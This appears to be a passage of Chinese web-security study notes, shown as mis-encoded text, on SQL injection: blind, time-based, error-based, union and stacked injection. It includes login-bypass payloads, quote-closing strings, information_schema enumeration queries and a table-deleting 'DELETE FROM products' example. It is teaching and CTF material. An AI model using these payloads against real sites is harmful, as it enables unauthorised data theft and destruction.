<p><code>å¯ä»¥ç”¨burpsuiteè¿›è¡Œpayloadçˆ†ç ´ï¼Œç”¨æ•°å­—å­—å…¸ï¼Œç›´æ¥ä»0-127ï¼ˆasciiç å…±127ä½ï¼‰ï¼Œç„¶åæ ¹æ®å›æ˜¾ï¼Œåˆ¤æ–­ï¼Œå°±ä¸ç”¨ä¸€ä¸ªä¸€ä¸ªæ…¢æ…¢å°è¯•</code></p>
<p><code>å¼ºçƒˆå»ºè®®å¯ä»¥å­¦ä¹ ä¸€ä¸‹pythonï¼Œè¿™æ ·å¯ä»¥è‡ªå·±é’ˆå¯¹æ€§çš„å†™ä¸€ä¸ªè„šæœ¬ï¼Œæ•ˆç‡æ›´é«˜</code></p>
<h6 id="ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼š"><a href="#ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼š" class="headerlink" title="ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼š"></a>ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼š</h6><p>å³ä¸èƒ½æ ¹æ®é¡µé¢è¿”å›å†…å®¹åˆ¤æ–­ä»»ä½•ä¿¡æ¯ï¼Œç”¨æ¡ä»¶è¯­å¥ï¼ˆifï¼‰æŸ¥çœ‹æ—¶é—´å»¶è¿Ÿè¯­å¥ï¼ˆsleep()ï¼‰æ˜¯å¦æ‰§è¡Œï¼ˆå³é¡µé¢è¿”å›æ—¶é—´æ˜¯å¦å¢åŠ ï¼‰æ¥åˆ¤æ–­ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> and <span class="built_in">if</span>(length(database()&gt;<span class="number">7</span>,<span class="built_in">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"><span class="comment">/*è¿™é‡Œåˆ¤æ–­å¦‚æœæ•°æ®åº“åå¤§äº7ï¼Œå°±å»¶è¿Ÿç½‘é¡µ5sï¼Œåæ­£æ²¡æœ‰å»¶è¿Ÿã€å°±æ˜¯æ‰§è¡Œ1ã€‘ï¼Œå‰©ä¸‹çš„å’Œboolç›²æ³¨ä¸€æ ·ï¼ŒæŒ¨ä¸ªè¯•è¯•ï¼Œæ¨æµ‹å‡ºæ•°æ®åº“åå’Œå…¶ä»–æ•°æ®*/</span></span><br></pre></td></tr></table></figure></div>

<h6 id="ï¼ˆ3ï¼‰åŸºäºæŠ¥é”™æ³¨å…¥ï¼š"><a href="#ï¼ˆ3ï¼‰åŸºäºæŠ¥é”™æ³¨å…¥ï¼š" class="headerlink" title="ï¼ˆ3ï¼‰åŸºäºæŠ¥é”™æ³¨å…¥ï¼š"></a>ï¼ˆ3ï¼‰åŸºäºæŠ¥é”™æ³¨å…¥ï¼š</h6><p>å³é¡µé¢ä¼šè¿”å›é”™è¯¯ä¿¡æ¯ï¼Œæˆ–è€…æŠŠæ³¨å…¥çš„è¯­å¥çš„ç»“æœç›´æ¥è¿”å›åœ¨é¡µé¢ä¸­ã€‚å¦‚ï¼šå•å¼•å·ã€åŒå¼•å·ã€åŸºäºæ•°å­—å‹æ³¨å…¥ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">æ¯”å¦‚æŸ¥è¯¢æ•°æ®åº“å</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">schema_name</span>) <span class="keyword">from</span> information_schema.schemata),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>

<p>â€ƒ*<strong>æ³¨æ„</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SAS"><figure class="iseeu highlight /sas"><table><tr><td class="code"><pre><span class="line">extractvalueå’Œupdatexmlåªæ˜¾ç¤º32ä½å­—ç¬¦</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥çˆ†å‡ºå­—ç¬¦ä¸å…¨æ—¶ï¼Œå¯ä»¥ç”¨<span class="meta">left</span>(xxx,<span class="keyword">length</span>)å’Œ<span class="meta">right</span>(xxx,<span class="keyword">length</span>)</span><br><span class="line">ã€æ³¨æ„0x7eä¹Ÿå°±æ˜¯~ä¹Ÿç®—å­—ç¬¦ä½ï¼ŒæŒ‰ä¸Šé¢ä¾‹å­ç”¨äº†ä¸¤ä¸ª~ï¼Œæ‰€ä»¥è¿™é‡Œæœ€å¤šåªèƒ½<span class="keyword">select</span> 30ä¸ªå­—ç¬¦äº†ï¼Œä½†å·¦å³éƒ½30ï¼Œä¸€å…±å¯ä»¥<span class="keyword">select</span> 60ä¸ªå­—ç¬¦ã€‘</span><br><span class="line"></span><br><span class="line">æˆ–è€…ç”¨<span class="meta">substr</span>(xxx,begin,<span class="keyword">length</span>)ï¼Œä»æ•°æ®çš„æŸä¸ªå¼€å§‹ã€è¿™é‡Œçš„å¼€å§‹ä½æ˜¯ä»1å¼€å§‹ï¼Œè€Œä¸æ˜¯0ã€‘æˆªå–ä¸€éƒ¨åˆ†æ˜¾ç¤º</span><br></pre></td></tr></table></figure></div>

<p>ï¼ˆ4ï¼‰è”åˆæŸ¥è¯¢æ³¨å…¥ï¼šå¯ä»¥ä½¿ç”¨unionçš„æƒ…å†µä¸‹çš„æ³¨å…¥ã€‚</p>
<p>ï¼ˆ5ï¼‰å †æŸ¥è¯¢æ³¨å…¥ï¼ˆå †å æ³¨å…¥ï¼‰ï¼šå¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥çš„æ‰§è¡Œæ—¶çš„æ³¨å…¥ã€‚</p>
<p>ï¼ˆ6ï¼‰å®½å­—èŠ‚æ³¨å…¥ï¼š</p>
<h5 id="â‘¢æŒ‰ç…§æ³¨å…¥ç‚¹ç±»å‹æ¥åˆ†ç±»ï¼š"><a href="#â‘¢æŒ‰ç…§æ³¨å…¥ç‚¹ç±»å‹æ¥åˆ†ç±»ï¼š" class="headerlink" title="â‘¢æŒ‰ç…§æ³¨å…¥ç‚¹ç±»å‹æ¥åˆ†ç±»ï¼š"></a>â‘¢æŒ‰ç…§æ³¨å…¥ç‚¹ç±»å‹æ¥åˆ†ç±»ï¼š</h5><p>â€ƒâ€ƒï¼ˆ1ï¼‰æ•°å­—å‹æ³¨å…¥ç‚¹ï¼šè®¸å¤šç½‘é¡µé“¾æ¥æœ‰ç±»ä¼¼çš„ç»“æ„ <a href="http://xxx.com/users.php?id=1">http://xxx.com/users.php?id=1</a> åŸºäºæ­¤ç§å½¢å¼çš„æ³¨å…¥ï¼Œå…¶æ³¨å…¥ç‚¹ id ç±»å‹ä¸ºæ•°å­—è‹¥å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œåˆ™å¯ä»¥åˆ©ç”¨ç½‘é¡µé€šè¿‡æ­¤ç§ç»“æ„ä¼ é€’idç­‰ä¿¡æ¯çš„åŸç†ï¼Œæ„é€ å‡ºç±»ä¼¼å¦‚ä¸‹çš„sqlæ³¨å…¥è¯­å¥è¿›è¡Œçˆ†ç ´ï¼šselect * from è¡¨å where id=1 and 1=1</p>
<p>â€ƒâ€ƒï¼ˆ2ï¼‰å­—ç¬¦å‹æ³¨å…¥ç‚¹ï¼šç½‘é¡µé“¾æ¥æœ‰ç±»ä¼¼çš„ç»“æ„ <a href="http://xxx.com/users.php?name=admin">http://xxx.com/users.php?name=admin</a> è¿™ç§å½¢å¼ï¼Œå…¶æ³¨å…¥ç‚¹ name ç±»å‹ä¸ºå­—ç¬¦ç±»å‹ï¼Œè‹¥å­˜åœ¨æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å‡ºç±»ä¼¼ä¸å¦‚ä¸‹çš„sqlæ³¨å…¥è¯­å¥è¿›è¡Œçˆ†ç ´ï¼šselect * from è¡¨å where name=â€˜adminâ€™ and 1=1 â€™</p>
<p>â€ƒâ€ƒï¼ˆ3ï¼‰æœç´¢å‹æ³¨å…¥ç‚¹ï¼šè¿™æ˜¯ä¸€ç±»ç‰¹æ®Šçš„æ³¨å…¥ç±»å‹ã€‚è¿™ç±»æ³¨å…¥ä¸»è¦æ˜¯æŒ‡åœ¨è¿›è¡Œæ•°æ®æœç´¢æ—¶æ²¡è¿‡æ»¤æœç´¢å‚æ•°ï¼Œä¸€èˆ¬åœ¨é“¾æ¥åœ°å€ä¸­æœ‰ â€œkeyword=å…³é”®å­—â€ æœ‰çš„ä¸æ˜¾ç¤ºåœ¨çš„é“¾æ¥åœ°å€é‡Œé¢ï¼Œè€Œæ˜¯ç›´æ¥é€šè¿‡æœç´¢æ¡†è¡¨å•æäº¤ã€‚æ­¤ç±»æ³¨å…¥ç‚¹æäº¤çš„ SQL è¯­å¥ï¼Œå…¶åŸå½¢å¤§è‡´ä¸ºï¼šselect * from è¡¨å where å­—æ®µ like â€˜%å…³é”®å­—%â€™ è‹¥å­˜åœ¨æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å‡ºç±»ä¼¼ä¸å¦‚ä¸‹çš„sqlæ³¨å…¥è¯­å¥è¿›è¡Œçˆ†ç ´ï¼šselect * from è¡¨å where å­—æ®µ like â€˜%æµ‹è¯•%â€™ and â€˜%1%â€™=â€™%1%â€™</p>
<h5 id="â‘£åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥-å“ªé‡Œå‘ç”Ÿäº†å½±å“"><a href="#â‘£åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥-å“ªé‡Œå‘ç”Ÿäº†å½±å“" class="headerlink" title="â‘£åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥(å“ªé‡Œå‘ç”Ÿäº†å½±å“)"></a>â‘£åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥(å“ªé‡Œå‘ç”Ÿäº†å½±å“)</h5><p>â˜…ä¸€é˜¶æ³¨å°„ </p>
<p>â˜…äºŒé˜¶æ³¨å°„ </p>
<p>ä¸€é˜¶æ³¨å°„æ˜¯æŒ‡è¾“å…¥çš„æ³¨å°„è¯­å¥å¯¹ WEB ç›´æ¥äº§ç”Ÿäº†å½±å“ï¼Œå‡ºç°äº†ç»“æœï¼›</p>
<p>äºŒé˜¶æ³¨å…¥<strong>ç±»ä¼¼å­˜å‚¨å‹ XSS</strong>ï¼Œæ˜¯æŒ‡è¾“å…¥æäº¤çš„è¯­å¥ï¼Œæ— æ³•ç›´æ¥å¯¹ WEB åº”ç”¨ç¨‹åºäº§ç”Ÿå½±å“ï¼Œé€šè¿‡å…¶å®ƒçš„è¾…åŠ©é—´æ¥çš„å¯¹ WEB äº§ç”Ÿå±å®³ï¼Œè¿™æ ·çš„å°±è¢«ç§°ä¸ºæ˜¯äºŒé˜¶æ³¨å…¥. </p>
<h4 id="1-å †å æ³¨å…¥"><a href="#1-å †å æ³¨å…¥" class="headerlink" title="1.å †å æ³¨å…¥"></a>1.å †å æ³¨å…¥</h4><h5 id="1-å †å æ³¨å…¥å®šä¹‰"><a href="#1-å †å æ³¨å…¥å®šä¹‰" class="headerlink" title="1.å †å æ³¨å…¥å®šä¹‰"></a>1.å †å æ³¨å…¥å®šä¹‰</h5><p>   Stacked  injections(å †å æ³¨å…¥)ä»åè¯çš„å«ä¹‰å°±å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯ä¸€å † sql è¯­å¥(å¤šæ¡)ä¸€èµ·æ‰§è¡Œã€‚è€Œåœ¨çœŸå®çš„è¿ç”¨ä¸­ä¹Ÿæ˜¯è¿™æ ·çš„, æˆ‘ä»¬çŸ¥é“åœ¨  mysql ä¸­, ä¸»è¦æ˜¯å‘½ä»¤è¡Œä¸­, æ¯ä¸€æ¡è¯­å¥ç»“å°¾åŠ ; è¡¨ç¤ºè¯­å¥ç»“æŸã€‚è¿™æ ·æˆ‘ä»¬å°±æƒ³åˆ°äº†æ˜¯ä¸æ˜¯å¯ä»¥å¤šå¥ä¸€èµ·ä½¿ç”¨ã€‚è¿™ä¸ªå«åš stacked  injectionã€‚</p>
<h5 id="2-å †å æ³¨å…¥åŸç†"><a href="#2-å †å æ³¨å…¥åŸç†" class="headerlink" title="2.å †å æ³¨å…¥åŸç†"></a>2.å †å æ³¨å…¥åŸç†</h5><p>   åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚<u>è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥</u>ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äº<u>union æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥</u>ï¼Œè€Œ<u>å †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥</u>ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š<code>1; DELETE FROM products</code>æœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼š  <code>Select * from products where productid=1;DELETE FROM products</code>å½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œ<u><strong>ç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯</strong></u>ï¼Œ<u><strong>ç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤</strong></u>ã€‚</p>
<h5 id="3-å †å æ³¨å…¥çš„å±€é™æ€§"><a href="#3-å †å æ³¨å…¥çš„å±€é™æ€§" class="headerlink" title="3.å †å æ³¨å…¥çš„å±€é™æ€§"></a>3.å †å æ³¨å…¥çš„å±€é™æ€§</h5><p>å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åºã€‚</p>
<p><strong>ä¸‹é¢æˆ‘ä»¥ä¸€é“é¢˜ä¸ºä¾‹è§£æå †å æ³¨å…¥ï¼Œè¯¥é¢˜æ¥è‡ªäº<a href="../../../../2022/06/21/buuctf-wp"> buuctfçš„[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ </a></strong></p>
<h4 id="2-æ— åˆ—åæ³¨å…¥"><a href="#2-æ— åˆ—åæ³¨å…¥" class="headerlink" title="2.æ— åˆ—åæ³¨å…¥"></a>2.<a href="https://www.cnblogs.com/Lee-404/p/12833788.html">æ— åˆ—åæ³¨å…¥</a></h4><p>ä¸Šé¢é“¾æ¥æ˜¯ä¸€ç¯‡å¤§ä½¬è®²è§£çš„æ— åˆ—åæ³¨å…¥ï¼Œä¹‹å‰åˆ·æ”»é˜²ä¸–ç•Œé‡åˆ°ç±»ä¼¼çš„é¢˜ç›®ï¼Œçœ‹äº†è¿™ç¯‡æ–‡ç« å­¦åˆ°äº†æ–°æŠ€å·§</p>
<h4 id="3-è”åˆæ³¨å…¥"><a href="#3-è”åˆæ³¨å…¥" class="headerlink" title="*3.è”åˆæ³¨å…¥"></a>*3.è”åˆæ³¨å…¥</h4><p><strong>è”åˆæ³¨å…¥æœ‰ä¸ªæŠ€å·§ã€‚åœ¨è”åˆæŸ¥è¯¢å¹¶ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œè”åˆæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ª è™šæ‹Ÿçš„æ•°æ®</strong></p>
<p>ä¸¾ä¸ªä¾‹å­ï¼š<br>æœ€åˆusersè¡¨ä¸­åªæœ‰ä¸€è¡Œæ•°æ®ï¼Œ</p>
<p><img src="/2022/05/28/Web-study/image-20220909230928678.png" alt="image-20220909230928678"></p>
<p><strong>æˆ‘ä»¬é€šè¿‡<code>union select</code>æŸ¥è¯¢å°±å¯ä»¥æ„é€ ä¸€è¡Œè™šæ‹Ÿçš„æ•°æ®ï¼Œ</strong></p>
<p><img src="/2022/05/28/Web-study/image-20220909231009396.png" alt="image-20220909231009396"></p>
<p>è¿™æ ·ï¼Œæˆ‘ä»¬åœ¨usersè¡¨ä¸­åˆ©ç”¨è”åˆæŸ¥è¯¢åˆ›å»ºäº†ä¸€è¡Œè™šæ‹Ÿçš„æ•°æ®ã€‚</p>
<hr>
<h4 id="1-å‡ ä¸ªå¸¸ç”¨å‡½æ•°"><a href="#1-å‡ ä¸ªå¸¸ç”¨å‡½æ•°" class="headerlink" title="1.å‡ ä¸ªå¸¸ç”¨å‡½æ•°"></a>1.å‡ ä¸ªå¸¸ç”¨å‡½æ•°</h4><p>1.<code>version()</code>â€”â€”MySQL ç‰ˆæœ¬ </p>
<p>2.<code>user()</code>â€”â€”æ•°æ®åº“ç”¨æˆ·å </p>
<p>3.<code>database()</code>â€”â€”æ•°æ®åº“å </p>
<p>4.<code>@@datadir</code>â€”â€”æ•°æ®åº“è·¯å¾„ </p>
<p>5.<code>@@version_compile_os</code>â€”â€”æ“ä½œç³»ç»Ÿç‰ˆæœ¬</p>
<h4 id="2-ä¸€èˆ¬ç”¨äºå°è¯•çš„é—­åˆè¯­å¥"><a href="#2-ä¸€èˆ¬ç”¨äºå°è¯•çš„é—­åˆè¯­å¥" class="headerlink" title="2.ä¸€èˆ¬ç”¨äºå°è¯•çš„é—­åˆè¯­å¥"></a>2.ä¸€èˆ¬ç”¨äºå°è¯•çš„<u>é—­åˆè¯­å¥</u></h4><p>Ps:<strong>â€“+å¯ä»¥ç”¨#æ›¿æ¢ï¼Œurl æäº¤è¿‡ç¨‹ä¸­ Url ç¼–ç åçš„#ä¸º%23ï¼Œâ€“+å’Œ#ä¸ºæ³¨é‡Šç¬¦ï¼ŒæŠŠåé¢è¯­å¥æ³¨é‡Šæ‰ï¼Œä½¿å…¶æ— æ³•æ‰§è¡Œ</strong></p>
<p><code>or 1=1--+</code> </p>
<p><code>&#39;or 1=1--+</code> </p>
<p><code>&quot;or 1=1--+</code> </p>
<p><code>)or 1=1--+</code> </p>
<p><code>&#39;)or 1=1--+</code> </p>
<p><code>&quot;) or 1=1--+</code> </p>
<p><code>&quot;))or 1=1--+</code></p>
<h4 id="3-sqlä¸­é€»è¾‘è¿ç®—ã€ä¸‡èƒ½å¯†ç çš„åŸç†ã€‘"><a href="#3-sqlä¸­é€»è¾‘è¿ç®—ã€ä¸‡èƒ½å¯†ç çš„åŸç†ã€‘" class="headerlink" title="3.sqlä¸­é€»è¾‘è¿ç®—ã€ä¸‡èƒ½å¯†ç çš„åŸç†ã€‘"></a>3.sqlä¸­é€»è¾‘è¿ç®—ã€ä¸‡èƒ½å¯†ç çš„åŸç†ã€‘</h4><p>æå‡ºä¸€ä¸ªé—®é¢˜ <code>Select * from users where id=1 and 1=1</code>;è¿™æ¡è¯­å¥ä¸ºä»€ä¹ˆèƒ½å¤Ÿé€‰æ‹©å‡º id=1 çš„å†…å®¹ï¼Œand 1=1 åˆ°åº•èµ·ä½œç”¨äº†æ²¡æœ‰ï¼Ÿè¿™é‡Œå°±è¦æ¸…æ¥š sql è¯­å¥æ‰§è¡Œé¡ºåºäº†ã€‚ åŒæ—¶è¿™ä¸ªé—®é¢˜æˆ‘ä»¬åœ¨ä½¿ç”¨ä¸‡èƒ½å¯†ç çš„æ—¶å€™ä¼šç”¨åˆ°ã€‚</p>
<p><code>Select * from admin where username=â€™adminâ€™ and password=â€™adminâ€™</code> </p>
<p>æˆ‘ä»¬å¯ä»¥ç”¨ <code>â€™or 1=1#</code> ä½œä¸ºå¯†ç è¾“å…¥ã€‚åŸå› æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ </p>
<p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªé€»è¾‘è¿ç®—ï¼Œå½“ä½¿ç”¨ä¸Šè¿°æ‰€è°“çš„ä¸‡èƒ½å¯†ç åï¼Œæ„æˆçš„ sql è¯­å¥ä¸ºï¼š </p>
<p><code>Select * from admin where username=â€™adminâ€™ and password=â€™â€™or 1=1#â€™</code> </p>
<p>Explain:ä¸Šé¢çš„è¿™ä¸ªè¯­å¥æ‰§è¡Œåï¼Œæˆ‘ä»¬åœ¨ä¸çŸ¥é“å¯†ç çš„æƒ…å†µä¸‹å°±ç™»å½•åˆ°äº† admin ç”¨æˆ·äº†ã€‚åŸ å›  æ˜¯ åœ¨ where å­ å¥ å ï¼Œ æˆ‘ ä»¬ å¯ ä»¥ çœ‹ åˆ° ä¸‰ ä¸ª æ¡ ä»¶ è¯­ å¥ <code>username=â€™adminâ€™ and password=â€™â€™or 1=1</code>ã€‚ä¸‰ä¸ªæ¡ä»¶ç”¨ and å’Œ or è¿›è¡Œè¿æ¥ã€‚åœ¨ sql ä¸­ï¼Œæˆ‘ä»¬ <u><strong>and çš„è¿ç®—ä¼˜å…ˆçº§å¤§äº or çš„å…ƒç®—ä¼˜å…ˆçº§</strong></u>ã€‚å› æ­¤å¯ä»¥çœ‹åˆ° <u><strong>ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼ˆç”¨ a è¡¨ç¤ºï¼‰æ˜¯çœŸçš„ï¼Œç¬¬äºŒä¸ªæ¡ä»¶ï¼ˆç”¨ b è¡¨ç¤ºï¼‰æ˜¯å‡çš„ï¼Œa and b = false</strong></u>,ç¬¬ä¸€ä¸ªæ¡ä»¶å’Œç¬¬äºŒä¸ªæ¡ä»¶æ‰§è¡Œ and åæ˜¯å‡ï¼Œå†ä¸<u><strong>ç¬¬ä¸‰ ä¸ªæ¡ä»¶ or è¿ç®—ï¼Œå› ä¸ºç¬¬ä¸‰ä¸ªæ¡ä»¶ 1=1 æ˜¯æ’æˆç«‹çš„ï¼Œæ‰€ä»¥ç»“æœè‡ªç„¶å°±ä¸ºçœŸäº†</strong></u>ã€‚å› æ­¤ä¸Šè¿°çš„è¯­ å¥å°±æ˜¯æ’çœŸäº†</p>
<p>ps é€»è¾‘è¯­å¥çš„åŒºåˆ«</p>
<p>1.and:ä¸¤ä¸ªæˆ–å¤šä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³ï¼Œæ‰ä¸ºçœŸï¼ˆæ˜¾ç¤ºä¸€æ¡æ•°æ®ï¼‰</p>
<p>2.or:ä¸¤ä¸ªæˆ–å¤šä¸ªæ¡ä»¶æ»¡è¶³å…¶ä¸­ä¸€ä¸ªå³ä¸ºçœŸï¼ˆæ˜¾ç¤ºä¸€æ¡æ•°æ®ï¼‰</p>
<p>ä½¿ç”¨andè¯­å¥æ³¨æ„<code>select * from test where a = 1 and a = 2</code>è¿™æ ·æ“ä½œè‚¯å®šä¸è¡Œï¼Œ<u><strong>åé¢çš„ä¸€ä¸ªå€¼ä¼šæŠŠå‰é¢çš„å€¼ç»™è¦†ç›–æ‰</strong></u>ï¼Œæœ€åæ‰§è¡Œçš„æ˜¯<code>select * from test where a = 2</code></p>
<p>è€Œç”¨orè¯­å¥çš„è¯<code>select * from test where a = 1 or a = 2</code>,æ‰§è¡Œ<code>select * from test where a = 1</code>,è‹¥<code>a=1</code>ä¸ºå‡ï¼Œåˆ™æ‰§è¡Œ<code>select * from test where a = 2</code></p>
<p>3.union:è”åˆæŸ¥è¯¢ï¼Œå°†<u><strong>å¤šä¸ªæŸ¥è¯¢ç»“æœåˆå¹¶ï¼ˆå¦‚æœæœ‰ä¸€ä¸ªç»“æœä¸ºç©ºï¼Œä¸å½±å“å…¶ä»–ç»“æœåˆå¹¶ï¼‰</strong></u>èµ·æ¥æ—¶ï¼Œ<u><strong>ç³»ç»Ÿä¼šè‡ªåŠ¨å»æ‰é‡å¤å…ƒç»„</strong></u></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br><span class="line"><span class="comment">/*è¿™é‡Œæ³¨æ„ï¼Œå¦‚æœid=1ï¼Œé‚£ä¹ˆç»“æœåˆå¹¶æ—¶ï¼Œå°±ä¼šè¦†ç›–åé¢çš„ç»“æœï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦å‰é¢çš„è¯­å¥è¿”å›ä¸ºç©ºï¼Œé‚£ä¹ˆåé¢çš„æ•°æ®å°±ä¼šæ˜¾ç°å‡ºæ¥*/</span></span><br></pre></td></tr></table></figure></div>

<p>è¯·æ³¨æ„ï¼ŒUNION å†…éƒ¨çš„ SELECT è¯­å¥å¿…é¡»æ‹¥æœ‰ç›¸åŒæ•°é‡çš„åˆ—ã€‚åˆ—ä¹Ÿå¿…é¡»æ‹¥æœ‰ç›¸ä¼¼çš„æ•°æ®ç±»å‹ã€‚åŒæ—¶ï¼Œæ¯æ¡ SELECT è¯­å¥ä¸­çš„åˆ—çš„é¡ºåºå¿…é¡»ç›¸åŒã€‚ </p>
<h4 id="4-æ³¨å…¥çš„ä¸€èˆ¬æµç¨‹ã€æŒ‰é¡ºåºæŸ¥è¯¢æ³¨å…¥ã€‘"><a href="#4-æ³¨å…¥çš„ä¸€èˆ¬æµç¨‹ã€æŒ‰é¡ºåºæŸ¥è¯¢æ³¨å…¥ã€‘" class="headerlink" title="4.æ³¨å…¥çš„ä¸€èˆ¬æµç¨‹ã€æŒ‰é¡ºåºæŸ¥è¯¢æ³¨å…¥ã€‘"></a>4.æ³¨å…¥çš„ä¸€èˆ¬æµç¨‹ã€æŒ‰é¡ºåºæŸ¥è¯¢æ³¨å…¥ã€‘</h4><h5 id="ps-å…³é”®è®°å¿†å’Œä½¿ç”¨"><a href="#ps-å…³é”®è®°å¿†å’Œä½¿ç”¨" class="headerlink" title="ps.å…³é”®è®°å¿†å’Œä½¿ç”¨"></a>ps.å…³é”®è®°å¿†å’Œä½¿ç”¨</h5><p><code>schema_name</code> æ•°æ®åº“å</p>
<p><code>information_schema.schemata</code> å…¨éƒ¨æ•°æ®åº“</p>
<p><code>table_name</code> è¡¨å</p>
<p><code>information_schema.tables</code> å…¨éƒ¨è¡¨</p>
<p><code>table_schema=â€™xxxxxâ€™</code> â€˜xxxxâ€™ä¸ºç›®æ ‡è¡¨æ‰€åœ¨çš„æ•°æ®åº“å</p>
<p><code>column_name</code> åˆ—å</p>
<p><code>information_schema.columns</code> å…¨éƒ¨åˆ—å</p>
<p><code>table_name=â€™xxxxxâ€™</code> â€˜xxxxâ€™æƒ³è¦æŸ¥è¯¢æ•°æ®æ‰€åœ¨çš„è¡¨å</p>
<h5 id="1-æ³¨å…¥è¯­å¥"><a href="#1-æ³¨å…¥è¯­å¥" class="headerlink" title="[1] æ³¨å…¥è¯­å¥"></a>[1] æ³¨å…¥è¯­å¥</h5><p>1ï¼‰çŒœæ•°æ®åº“ ã€ä»¥ä¸‹è¯­å¥åŠŸèƒ½ï¼Œæ˜¾ç¤ºè¯¥æ•°æ®åº“å†…æ‰€æœ‰æ•°æ®åº“çš„åå­—ã€‘</p>
<p><code>select schema_name from information_schema.schemata</code> </p>
<p>2ï¼‰çŒœæŸåº“çš„æ•°æ®è¡¨ ã€ä»¥ä¸‹è¯­å¥åŠŸèƒ½ï¼Œæ˜¾ç¤ºè¯¥æ•°æ®åº“å†…æ‰€æœ‰æ•°æ®åº“çš„åå­—ã€‘</p>
<p><code>select table_name from information_schema.tables where table_schema=â€™xxxxxâ€™</code> </p>
<p>3ï¼‰çŒœæŸè¡¨çš„æ‰€æœ‰åˆ—ã€ä»¥ä¸‹è¯­å¥åŠŸèƒ½ï¼Œæ˜¾ç¤ºè¯¥æ•°æ®åº“å†…æ‰€æœ‰æ•°æ®åº“çš„åå­—ã€‘</p>
<p><code>Select column_name from information_schema.columns where table_name=â€™xxxxxâ€™</code> </p>
